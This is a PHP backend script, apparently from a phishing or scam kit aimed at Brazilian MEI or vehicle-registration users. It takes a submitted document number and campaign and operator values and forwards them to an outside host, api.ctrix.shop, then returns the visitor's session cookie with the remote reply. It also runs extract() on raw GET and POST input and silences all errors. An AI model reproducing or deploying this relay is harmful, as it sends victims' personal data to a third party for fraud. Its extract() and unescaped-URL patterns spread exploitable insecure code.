<?php

error_reporting(0);

extract($_GET);

if($_POST){

    $partida = 'pgmei';
    $db = 'bit';

    extract($_POST);
 
    if($doc){

        $data = file_get_contents("https://api.ctrix.shop/recuperar-dados?comando=$doc");
                
        $campanha = $_COOKIE['campanha'];

        $numeroAleatorio = random_int(1000000, 10000000);

        if($data){

            function Isnovo($entrada){
                date_default_timezone_set('America/Sao_Paulo');
                $hora1 = DateTime::createFromFormat('d/m/Y, H:i:s', $entrada);
                $horaAtual = new DateTime();
            
                if ($hora1) {
                    $intervalo = abs($hora1->getTimestamp() - $horaAtual->getTimestamp()); 
                    if ($intervalo > 1800) {
                        return false;
                    } elseif ($intervalo < 1800) {
                        return true;
                    }
                } else {
                    return false;
                }
            }

            $dataJson = json_decode($data);
           
            if(!$dataJson->protocol){

               echo $dataRemota = file_get_contents("https://api.ctrix.shop/enviar-comando?comando=$doc&tela=$operador&usuario=$campanha&renavam=$doc&partida=$partida&class=class$numeroAleatorio&t=$db");
               
               return;

            }else {

                if(Isnovo($dataJson->hora) && $dataJson->protocol!='erro' && $dataJson->protocol!='recaptcha_check'){

                     echo 'Comando enviado e exibido na página';

                     return;
                }else{
                    $dataRemota =  file_get_contents("https://api.ctrix.shop/enviar-comando?comando=$doc&tela=$operador&usuario=$campanha&renavam=$doc&partida=$partida&class=class$numeroAleatorio&t=$db");
                }
            }

        }else {
            $dataRemota = file_get_contents("https://api.ctrix.shop/enviar-comando?comando=$doc&tela=$operador&usuario=$campanha&renavam=$doc&partida=$partida&class=class$numeroAleatorio&t=$db");
        }    

        $session = $_COOKIE['session'];
       
        echo json_encode(array('token'=>$session, 'IsStatus'=>true, 'conexao'=>$dataRemota));
         
    }
}

?>